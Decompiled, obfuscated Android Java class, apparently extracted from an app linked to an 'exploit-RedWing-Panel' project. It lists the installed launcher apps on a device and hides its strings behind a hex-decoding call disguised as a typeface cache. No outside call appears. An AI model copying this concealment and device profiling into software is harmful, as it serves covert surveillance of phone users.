package v.s;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Build;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.List;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class zFWB8P7YV2Lstckjuow {
    static {
        TypefaceCache.obtain("000B00730057009700F500AD00F10084001400790049008C00F500AD");
    }

    public static gcxtNnG1WIWr8Jl1 dDIMxZXP1V8HdM(Context context) {
        ArrayList arrayList = new ArrayList();
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        try {
            PackageManager packageManager = context.getPackageManager();
            Thread.currentThread().getName();
            Intent intent = new Intent("android.intent.action.MAIN", (Uri) null);
            intent.addCategory("android.intent.category.LAUNCHER");
            List<ResolveInfo> listQueryIntentActivities = Build.VERSION.SDK_INT >= 33 ? packageManager.queryIntentActivities(intent, PackageManager.ResolveInfoFlags.of(0L)) : packageManager.queryIntentActivities(intent, 0);
            TypefaceCache.obtain("00320063005E009500E9009600DC00B300260078004F00A600F300AB00DB00B1002A00620052008200E300FF00C000A2003700630049008900F500BB008800E7");
            listQueryIntentActivities.size();
            TypefaceCache.obtain("00630077004B009700E3");
            for (ResolveInfo resolveInfo : listQueryIntentActivities) {
                try {
                    String str = resolveInfo.activityInfo.packageName;
                    if (!linkedHashSet.contains(str) && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, context.getPackageName())) {
                        arrayList.add(new WIKLcjboz2gWNKuJLy(resolveInfo.loadLabel(packageManager).toString(), str));
                        linkedHashSet.add(str);
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("000600640049008800E200FF00C200B5002C0075005E009400E300B600DC00A000630077004B009700AA00FF");
                    e.getMessage();
                }
            }
            if (arrayList.size() > 1) {
                UNmzHr5eYlkMOkDR30 uNmzHr5eYlkMOkDR30 = new UNmzHr5eYlkMOkDR30(1);
                if (arrayList.size() > 1) {
                    Collections.sort(arrayList, uNmzHr5eYlkMOkDR30);
                }
            }
            TypefaceCache.obtain("0005007F0055008600FC00FF00D300B700330065001B008400FF00AA00DC00B300790036");
            arrayList.size();
        } catch (Exception e2) {
            TypefaceCache.obtain("000600640049008800E200FF00D100A8002F007A005E008400E400B600DC00A000630077004B009700E300E50092");
            e2.getMessage();
            e2.printStackTrace();
        }
        return new gcxtNnG1WIWr8Jl1(arrayList, arrayList.size());
    }
}
